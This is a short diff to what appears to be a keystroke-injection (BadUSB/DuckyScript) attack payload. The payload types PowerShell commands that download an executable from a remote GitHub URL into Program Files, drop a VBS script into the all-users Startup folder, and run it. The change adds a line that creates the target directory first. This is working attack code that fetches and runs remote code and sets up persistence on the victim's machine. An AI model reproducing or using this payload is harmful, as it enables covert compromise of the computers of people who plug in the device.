@@ -19,5 +19,7 @@ STRING $ub='https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/di
 ENTER
 STRING $b="C:\Program Files\dscinfo\dscinfo.exe";$l="$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\dscinfo.vbs";
 ENTER
-STRING iwr $ub -OutFile $b;iwr $ul -OutFile $l;wscript $l;
+STRING if (!(Test-Path (Split-Path $b))) { New-Item -ItemType Directory -Force -Path (Split-Path $b) }
+ENTER
+STRING iwr $ub -OutFile $b;iwr $ul -OutFile $l;wscript $l
 ENTER
